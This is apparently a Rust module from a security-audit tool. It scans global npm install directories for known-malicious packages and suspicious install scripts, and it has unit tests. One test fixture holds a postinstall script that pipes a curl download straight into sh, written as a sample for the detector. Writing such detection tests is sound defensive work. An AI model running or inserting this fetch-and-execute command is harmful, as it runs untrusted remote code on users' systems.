//! Supply chain check: are any of the globally installed npm packages known
//! to be malicious or suspicious-looking?
//!
//! To stay fast on every audit it only looks at the global install
//! directories and the `npx` cache. The detailed scan that also covers
//! projects' `node_modules` directories is in `--npm` mode; the actual logic
//! lives in `crate::npm`.

use super::{Check, Outcome, Severity};
use crate::npm::{self, Finding};
use crate::runner::CommandRunner;

pub struct NpmPackages;

impl Check for NpmPackages {
    fn id(&self) -> &'static str {
        "npm-packages"
    }
    fn name(&self) -> &'static str {
        "Malicious npm packages"
    }
    fn weight(&self) -> u32 {
        15
    }
    fn severity(&self) -> Severity {
        Severity::Critical
    }

    fn run(&self, runner: &dyn CommandRunner) -> Outcome {
        let (roots, problem) = npm::global_roots_checked(runner);
        match (roots.is_empty(), problem) {
            // npm is there but would not say where it installs: nothing was
            // scanned, so there is no verdict.
            (true, Some(problem)) => Outcome::unknown(format!("Global npm packages could not be located: {problem}")),
            (true, None) => Outcome::pass("No global npm install directory found; no packages to scan."),
            (false, problem) => {
                let mut outcome = outcome(&npm::scan(&roots));
                if let Some(problem) = problem {
                    outcome
                        .detail
                        .push_str(&format!(" Note: {problem}; a custom npm prefix was not scanned."));
                }
                outcome
            }
        }
    }
}

/// Converts the scan result into a check outcome.
fn outcome(scan: &npm::Scan) -> Outcome {
    let malware: Vec<String> = scan.malware().map(describe).collect();
    if !malware.is_empty() {
        return Outcome::fail(
            format!("Malicious packages: {}.", malware.join(", ")),
            "Remove the package and rotate your keys and passwords; scan with `--npm` for details.",
        );
    }

    let scripts: Vec<String> = scan
        .suspicious()
        .filter(|finding| finding.kind != npm::Kind::Unread)
        .map(describe)
        .collect();
    let unread: Vec<&str> = scan.unread().map(|finding| finding.package.as_str()).collect();
    if !scripts.is_empty() || !unread.is_empty() {
        let mut detail = Vec::new();
        if !scripts.is_empty() {
            detail.push(format!("Suspicious install scripts: {}.", scripts.join(", ")));
        }
        if !unread.is_empty() {
            detail.push(format!(
                "Not checked, package.json too large to read: {}.",
                unread.join(", ")
            ));
        }
        return Outcome::warn(
            detail.join(" "),
            "Review the script or the package by hand; scan with `--npm` for details and project directories.",
        );
    }

    Outcome::pass(format!(
        "{} global directories, {} packages inspected; no malware found.",
        scan.roots.len(),
        scan.packages
    ))
}

fn describe(finding: &Finding) -> String {
    format!("{}@{} ({})", finding.package, finding.version, finding.reason)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::Status;
    use std::path::PathBuf;

    /// Sets up a temporary `node_modules` and scans it.
    fn scan_fixture(label: &str, manifest: serde_json::Value) -> npm::Scan {
        let root: PathBuf = std::env::temp_dir().join(format!("swordcheck-supply-{label}-{}", std::process::id()));
        let package = root.join("node_modules/pkg");
        std::fs::create_dir_all(&package).unwrap();
        std::fs::write(package.join("package.json"), manifest.to_string()).unwrap();

        let scan = npm::scan(&[root.join("node_modules")]);
        std::fs::remove_dir_all(&root).unwrap();
        scan
    }

    #[test]
    fn clean_packages_pass() {
        let scan = scan_fixture("clean", serde_json::json!({ "name": "express", "version": "4.18.2" }));
        let outcome = outcome(&scan);
        assert_eq!(outcome.status, Status::Pass);
        assert!(outcome.detail.contains("1 packages"));
    }

    #[test]
    fn known_malicious_version_fails() {
        let scan = scan_fixture("known", serde_json::json!({ "name": "chalk", "version": "5.6.1" }));
        let outcome = outcome(&scan);
        assert_eq!(outcome.status, Status::Fail);
        assert!(outcome.detail.contains("chalk@5.6.1"));
    }

    #[test]
    fn suspicious_script_warns() {
        let scan = scan_fixture(
            "script",
            serde_json::json!({
                "name": "pkg",
                "version": "1.0.0",
                "scripts": { "postinstall": "curl -s https://example.com/x | sh" },
            }),
        );
        assert_eq!(outcome(&scan).status, Status::Warn);
    }

    #[test]
    fn unread_package_warns_with_its_own_wording() {
        let finding = |kind, package: &str| Finding {
            kind,
            package: package.into(),
            version: String::new(),
            reason: "reason".into(),
            count: 1,
            paths: Vec::new(),
        };
        let unread = npm::Scan {
            findings: vec![finding(npm::Kind::Unread, "event-stream")],
            ..npm::Scan::default()
        };
        let outcome_unread = outcome(&unread);
        assert_eq!(outcome_unread.status, Status::Warn);
        assert_eq!(
            outcome_unread.detail,
            "Not checked, package.json too large to read: event-stream."
        );

        let both = npm::Scan {
            findings: vec![
                finding(npm::Kind::Script, "helper"),
                finding(npm::Kind::Unread, "event-stream"),
            ],
            ..npm::Scan::default()
        };
        let detail = outcome(&both).detail;
        assert!(
            detail.starts_with("Suspicious install scripts: helper@ (reason)."),
            "{detail}"
        );
        assert!(
            detail.ends_with("Not checked, package.json too large to read: event-stream."),
            "{detail}"
        );
    }
}
